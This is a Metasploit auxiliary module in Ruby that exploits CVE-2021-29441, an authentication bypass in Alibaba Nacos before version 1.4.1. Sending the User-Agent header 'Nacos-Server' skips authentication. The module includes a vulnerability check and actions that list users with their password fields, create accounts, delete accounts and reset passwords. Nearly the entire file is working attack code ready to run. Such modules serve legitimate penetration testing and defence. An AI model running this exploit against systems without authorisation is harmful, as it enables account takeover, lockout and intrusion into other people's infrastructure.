##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Nacos Authentication Bypass User Management',
        'Description' => %q{
          This module exploits an authentication bypass vulnerability in Alibaba Nacos
          versions prior to 1.4.1. By using the special User-Agent header 'Nacos-Server',
          an attacker can bypass authentication and perform administrative actions such
          as listing, creating, deleting, and updating user passwords.
        },
        'Author' => ['K3ysTr0K3R'],
        'References' => [
          ['CVE', '2021-29441'],
          ['URL', 'https://github.com/alibaba/nacos/issues/4562'],
          ['URL', 'https://github.com/ARPSyndicate/cvemon/blob/master/CVE-2021-29441'],
          ['URL', 'https://github.com/K3ysTr0K3R/CVE-2021-29441'],
        ],
        'License' => MSF_LICENSE,
        'Actions' => [
          ['LIST_USERS', { 'Description' => 'List existing users' }],
          ['CREATE_USER', { 'Description' => 'Create a new user' }],
          ['DELETE_USER', { 'Description' => 'Delete a user' }],
          ['UPDATE_PASSWORD', { 'Description' => 'Update a user\'s password' }]
        ],
        'DefaultAction' => 'LIST_USERS',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES, ARTIFACTS_ON_DISK, ACCOUNT_LOCKOUTS]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(8848),
        OptString.new('TARGETURI', [true, 'Base path to Nacos', '/']),
        OptString.new('NEW_USERNAME', [false, 'User to create', Faker::Internet.username], conditions: %w[ACTION == CREATE_USER]),
        OptString.new('PASSWORD', [false, 'Password for user creation'], conditions: %w[ACTION == CREATE_USER]),
        OptString.new('USERNAME_TO_DELETE', [false, 'User to delete'], conditions: %w[ACTION == DELETE_USER]),
        OptString.new('USERNAME', [false, 'User whose password will be updated'], conditions: %w[ACTION == UPDATE_PASSWORD]),
        OptString.new('NEW_PASSWORD', [false, 'New password'], conditions: %w[ACTION == UPDATE_PASSWORD])
      ]
    )
  end

  def check
    validation_error = validate
    return Exploit::CheckCode::Unknown(validation_error) if validation_error

    unauthenticated_res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/nacos/v1/auth/users'),
      'vars_get' => { 'pageNo' => 1, 'pageSize' => 1 }
    )

    return Exploit::CheckCode::Unknown('No response from target') unless unauthenticated_res

    if unauthenticated_res.code == 200 && unauthenticated_res.get_json_document&.key?('pageItems')
      return Exploit::CheckCode::Safe('Nacos authentication does not appear to be enabled')
    end

    unless unauthenticated_res.code == 403
      return Exploit::CheckCode::Unknown("Unexpected response to unauthenticated request: HTTP #{unauthenticated_res.code}")
    end

    bypass_res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/nacos/v1/auth/users'),
      'vars_get' => { 'pageNo' => 1, 'pageSize' => 1 },
      'headers' => { 'User-Agent' => 'Nacos-Server' }
    )

    return Exploit::CheckCode::Unknown('No response to authentication bypass request') unless bypass_res

    if bypass_res.code == 200 && bypass_res.get_json_document&.key?('pageItems')
      return Exploit::CheckCode::Vulnerable('Successfully bypassed Nacos authentication')
    end

    Exploit::CheckCode::Safe('Target does not appear vulnerable')
  end

  def run
    validation_error = validate
    fail_with(Failure::BadConfig, validation_error) if validation_error

    case action.name
    when 'LIST_USERS'
      list_users
    when 'CREATE_USER'
      create_user
    when 'DELETE_USER'
      delete_user
    when 'UPDATE_PASSWORD'
      update_password
    end
  end

  def validate
    required_options = case action.name
                       when 'CREATE_USER'
                         %w[NEW_USERNAME PASSWORD]
                       when 'DELETE_USER'
                         %w[USERNAME_TO_DELETE]
                       when 'UPDATE_PASSWORD'
                         %w[USERNAME NEW_PASSWORD]
                       else
                         []
                       end

    missing_options = required_options.select { |option| datastore[option].blank? }
    return if missing_options.empty?

    "The following options are required for #{action.name}: #{missing_options.join(', ')}"
  end

  private

  def list_users
    print_status('Listing users...')

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/nacos/v1/auth/users'),
      'vars_get' => { 'pageNo' => 1, 'pageSize' => 50 },
      'headers' => { 'User-Agent' => 'Nacos-Server' }
    )

    unless res && res.code == 200
      print_error('Failed to retrieve user list')
      return
    end

    json = res.get_json_document

    unless json && json['pageItems']
      print_error('No user data in response')
      return
    end

    users = json['pageItems']

    if users.empty?
      print_status('No users found')
      return
    end

    table = Rex::Text::Table.new(
      'Header' => 'Nacos Users',
      'Columns' => ['Username', 'Password', 'Roles'],
      'Indent' => 0
    )

    users.each do |user|
      username = user['username'] || 'N/A'
      password = user['password'] || '********'
      roles = user['roles']&.join(', ') || 'user'

      table << [username, password, roles]
    end

    print_line(table.to_s)
  end

  def create_user
    username = datastore['NEW_USERNAME']
    password = datastore['PASSWORD']

    print_status("Creating user '#{username}'...")

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/nacos/v1/auth/users'),
      'headers' => { 'User-Agent' => 'Nacos-Server' },
      'vars_post' => { 'username' => username, 'password' => password }
    )

    fail_with(Failure::Unreachable, 'No response from target') unless res

    json = res.get_json_document
    fail_with(Failure::UnexpectedReply, "Failed to create user: HTTP #{res.code} #{json['message'] || res.body}") unless res.code == 200 && json['code'] == 200

    print_good("User '#{username}' created successfully")
  end

  def delete_user
    username = datastore['USERNAME_TO_DELETE']

    print_status("Deleting user '#{username}'...")

    res = send_request_cgi(
      'method' => 'DELETE',
      'uri' => normalize_uri(target_uri.path, '/nacos/v1/auth/users'),
      'vars_get' => { 'username' => username },
      'headers' => { 'User-Agent' => 'Nacos-Server' }
    )

    fail_with(Failure::Unreachable, 'No response from target') unless res

    json = res.get_json_document
    fail_with(Failure::UnexpectedReply, "Failed to delete user: HTTP #{res.code} #{json['message'] || res.body}") unless res.code == 200 && json['code'] == 200

    print_good("User '#{username}' deleted successfully")
  end

  def update_password
    username = datastore['USERNAME']
    new_password = datastore['NEW_PASSWORD']

    print_status("Updating password for user '#{username}'...")

    res = send_request_cgi(
      'method' => 'PUT',
      'uri' => normalize_uri(target_uri.path, '/nacos/v1/auth/users'),
      'vars_get' => { 'username' => username, 'newPassword' => new_password },
      'headers' => { 'User-Agent' => 'Nacos-Server' }
    )

    fail_with(Failure::Unreachable, 'No response from target') unless res

    json = res.get_json_document
    fail_with(Failure::UnexpectedReply, "Failed to update password: HTTP #{res.code} #{json['message'] || res.body}") unless res.code == 200 && json['code'] == 200

    print_good("Password for '#{username}' updated successfully")
  end
end
